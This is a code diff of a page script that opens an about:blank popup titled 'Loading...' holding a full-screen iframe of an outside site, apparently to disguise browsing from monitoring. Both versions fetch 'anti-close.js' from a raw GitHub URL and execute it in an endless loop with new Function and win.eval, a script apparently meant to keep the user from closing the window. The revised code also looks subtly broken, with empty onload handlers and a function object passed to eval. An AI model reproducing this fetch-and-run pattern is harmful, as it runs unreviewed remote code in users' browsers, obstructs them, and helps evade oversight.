@@ -54,106 +54,103 @@ const frameDelay = 90;
 const favicon16Folder = '/favicon16';
 const favicon32Folder = '/favicon32';
 
-function generateFrames(folder,count){
-  const frames=[];
-  for(let i=0;i<count;i++){
-    const num=String(i).padStart(3,'0');
+// Generate frame names
+function generateFrames(folder) {
+  const frames = [];
+  for (let i = 0; i < totalFrames; i++) {
+    const num = String(i).padStart(3,'0');
     frames.push(`${folder}/frame_${num}.png`);
   }
   return frames;
 }
 
-const favicon16=generateFrames(favicon16Folder,totalFrames);
-const favicon32=generateFrames(favicon32Folder,totalFrames);
-
-document.getElementById('openBtn').addEventListener('click',()=>{
-  const win=window.open('about:blank','_blank');
+document.getElementById('openBtn').addEventListener('click', () => {
+  const win = window.open('about:blank','_blank');
   if(!win) return alert('Popup blocked! Please allow popups.');
 
-  const frames=(window.devicePixelRatio>1 && favicon32.length>0)?favicon32:favicon16;
+  const folder = window.devicePixelRatio > 1 ? favicon32Folder : favicon16Folder;
+  const frames = generateFrames(folder);
 
-  // Preload images but start animation instantly
-  const images=[];
-  frames.forEach(src=>{
-    const img=new Image();
-    img.src=src;
+  // Preload first 8 frames instantly
+  const images = [];
+  const preloadCount = Math.min(8, frames.length);
+  frames.forEach((src,i) => {
+    const img = new Image();
+    img.src = src;
     images.push(img);
+    if(i < preloadCount) img.onload = () => {};
   });
 
+  // Remaining frames load asynchronously
+  for(let i=preloadCount; i<frames.length; i++) images[i].onload = () => {};
+
+  // Write popup content
   win.document.write(`
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <meta name="theme-color" content="#111111">
-    <link rel="icon" href="">
-    <style>
-      html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#111;}
-      iframe{width:100vw;height:100vh;border:none;}
-    </style>
-  </head>
-  <body>
-    <iframe src="https://nullxiety.com" allowfullscreen></iframe>
-    <script>
-      // ===== Instant Favicon GIF Animation =====
-      const frames=${JSON.stringify(frames)};
-      const frameDelay=${frameDelay};
-      const images=[];
-      frames.forEach(src=>{
-        const img=new Image();
-        img.src=src;
-        images.push(img);
-      });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<meta name="theme-color" content="#111111">
+<link rel="icon" href="${frames[0]}">
+<style>
+html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#111;}
+iframe{width:100vw;height:100vh;border:none;}
+</style>
+</head>
+<body>
+<iframe src="https://nullxiety.com" allowfullscreen></iframe>
+<script>
+// Favicon animation
+const frames = ${JSON.stringify(frames)};
+const frameDelay = ${frameDelay};
+const images = [];
+frames.forEach(src => { const img = new Image(); img.src = src; images.push(img); });
+const canvas = document.createElement('canvas');
+let size = Math.min(32, window.devicePixelRatio > 1 ? 32 : 16);
+canvas.width = size; canvas.height = size;
+const ctx = canvas.getContext('2d');
+const link = document.querySelector('link[rel="icon"]') || document.createElement('link');
+link.rel='icon';
+document.head.appendChild(link);
 
-      const canvas=document.createElement('canvas');
-      let size=Math.min(32,window.devicePixelRatio>1?32:16);
-      canvas.width=size; canvas.height=size;
-      const ctx=canvas.getContext('2d');
-      const link=document.querySelector('link[rel="icon"]')||document.createElement('link');
-      link.rel='icon';
-      document.head.appendChild(link);
+let current = 0;
+let lastTime = performance.now();
+function animateFavicon(now){
+  if(now - lastTime >= frameDelay){
+    const img = images[current];
+    if(img.complete){
+      ctx.clearRect(0,0,size,size);
+      ctx.drawImage(img,0,0,size,size);
+      link.href = canvas.toDataURL('image/png');
+    }
+    current = (current + 1) % images.length;
+    lastTime = now;
+  }
+  requestAnimationFrame(animateFavicon);
+}
+requestAnimationFrame(animateFavicon);
 
-      let current=0;
-      let lastTime=performance.now();
-
-      function animateFavicon(now){
-        if(now - lastTime >= frameDelay){
-          const img=images[current];
-          if(img.complete){
-            ctx.clearRect(0,0,size,size);
-            ctx.drawImage(img,0,0,size,size);
-            link.href=canvas.toDataURL('image/png');
-          }
-          current=(current+1)%images.length;
-          lastTime=now;
-        }
-        requestAnimationFrame(animateFavicon);
-      }
-      requestAnimationFrame(animateFavicon);
-
-      window.addEventListener('resize',()=>{
-        size=Math.min(32,window.devicePixelRatio>1?32:16);
-        canvas.width=size; canvas.height=size;
-      });
-
-      // ===== Load anti-close.js once and run infinitely =====
-      (function(){
-        fetch('https://raw.githubusercontent.com/stetson609-wq/loading.../refs/heads/main/anti-close.js')
-          .then(res=>res.text())
-          .then(code=>{
-            // Wrap main function in a requestAnimationFrame loop
-            const func = new Function(code + '\\n; function loop(){ try{ main(); } catch(e){console.error(e);} requestAnimationFrame(loop);} loop();');
-            func();
-          })
-          .catch(err=>console.error('Failed to load anti-close.js:', err));
-      })();
-    </script>
-  </body>
-  </html>
+window.addEventListener('resize',()=>{
+  size = Math.min(32, window.devicePixelRatio > 1 ? 32 : 16);
+  canvas.width = size;
+  canvas.height = size;
+});
+</script>
+</body>
+</html>
   `);
   win.document.close();
+
+  // Load anti-close.js after popup is ready
+  fetch('https://raw.githubusercontent.com/stetson609-wq/loading.../refs/heads/main/anti-close.js')
+    .then(res=>res.text())
+    .then(code=>{
+      const func = new Function(code + '\\n; function loop(){ try{ main(); } catch(e){console.error(e);} requestAnimationFrame(loop);} loop();');
+      win.eval(func);
+    })
+    .catch(err => console.error('Failed to load anti-close.js:', err));
 });
 </script>
 </body>
